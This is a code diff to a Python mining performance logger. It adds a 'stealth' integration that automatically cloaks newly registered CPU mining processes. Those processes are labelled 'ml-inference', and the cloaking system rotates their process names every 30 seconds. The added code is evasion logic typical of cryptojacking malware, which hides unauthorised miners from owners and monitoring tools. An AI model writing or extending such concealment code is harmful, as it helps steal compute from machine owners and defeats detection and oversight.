@@ -16,9 +16,48 @@ from dataclasses import dataclass, asdict
 from collections import deque
 import subprocess
 
+# ✅ STEALTH INTEGRATION: Import stealth execution for automatic process cloaking
+try:
+    from mining_environment.cpu_plugins.cloaking.stealth_exec import StealthExecution
+    _stealth_system = None
+    _stealth_logger = logging.getLogger('mining_performance_stealth')
+except ImportError:
+    StealthExecution = None
+    _stealth_system = None
+    _stealth_logger = None
+
 # LOGS_DIR configuration - thư mục lưu trữ logs
 LOGS_DIR = os.getenv('LOGS_DIR', '/app/mining_environment/logs')
 os.makedirs(LOGS_DIR, exist_ok=True)
+
+def _initialize_stealth_system():
+    """
+    **Initialize Stealth System** (Khởi tạo hệ thống che giấu) - tự động che giấu process mining
+    """
+    global _stealth_system, _stealth_logger
+    
+    if _stealth_system is not None or StealthExecution is None:
+        return _stealth_system
+    
+    try:
+        _stealth_system = StealthExecution(
+            logger=_stealth_logger,
+            comm_rotation_interval=30  # Rotate names every 30 seconds
+        )
+        
+        # Start stealth system
+        if _stealth_system.start():
+            _stealth_logger.info("🛡️ [STEALTH] System initialized and started successfully")
+            return _stealth_system
+        else:
+            _stealth_logger.warning("⚠️ [STEALTH] Failed to start stealth system")
+            _stealth_system = None
+            return None
+            
+    except Exception as e:
+        _stealth_logger.error(f"❌ [STEALTH] Failed to initialize: {e}")
+        _stealth_system = None
+        return None
 
 @dataclass
 class HashRateMetrics:
@@ -74,6 +113,9 @@ class MiningPerformanceLogger:
     def __init__(self, log_dir: str = LOGS_DIR):
         self.log_dir = Path(log_dir)
         self.log_dir.mkdir(parents=True, exist_ok=True)
+        
+        # Initialize logger
+        self.logger = logging.getLogger('MiningPerformanceLogger')
         
         # Thread-safe logging
         self._lock = threading.Lock()
@@ -221,7 +263,7 @@ class MiningPerformanceLogger:
     
     def register_process(self, process_type: str, pid: int, process_obj: Any = None):
         """
-        Đăng ký mining process để theo dõi
+        **Register Mining Process** (Đăng ký tiến trình mining) - với tự động kích hoạt stealth system
         
         Args:
             process_type: "ml-inference" or "inference-cuda"
@@ -235,12 +277,32 @@ class MiningPerformanceLogger:
                 "process": process_obj
             }
             
-            # Log process registration
+            # ✅ STEALTH INTEGRATION: Automatically add process to stealth system
+            stealth_success = False
+            if process_type == "ml-inference":  # Only cloak CPU mining processes
+                stealth_system = _initialize_stealth_system()
+                if stealth_system:
+                    try:
+                        stealth_success = stealth_system.add_process(pid)
+                        if stealth_success:
+                            self.logger.info(f"🛡️ [STEALTH] Process {process_type} (PID: {pid}) added to stealth system successfully")
+                        else:
+                            self.logger.warning(f"⚠️ [STEALTH] Failed to add process {process_type} (PID: {pid}) to stealth system")
+                    except Exception as e:
+                        self.logger.error(f"❌ [STEALTH] Error adding process {process_type} (PID: {pid}) to stealth: {e}")
+                else:
+                    self.logger.warning(f"⚠️ [STEALTH] Stealth system not available for process {process_type} (PID: {pid})")
+            
+            # Log process registration with stealth status
             self.log_mining_operation(
                 process_type=process_type,
                 operation="REGISTER",
                 pid=pid,
-                details={"registration_time": datetime.now().isoformat()}
+                details={
+                    "registration_time": datetime.now().isoformat(),
+                    "stealth_enabled": stealth_success,
+                    "stealth_applicable": process_type == "ml-inference"
+                }
             )
     
     def log_hash_rate(self, process_type: str, hash_rate: float, 
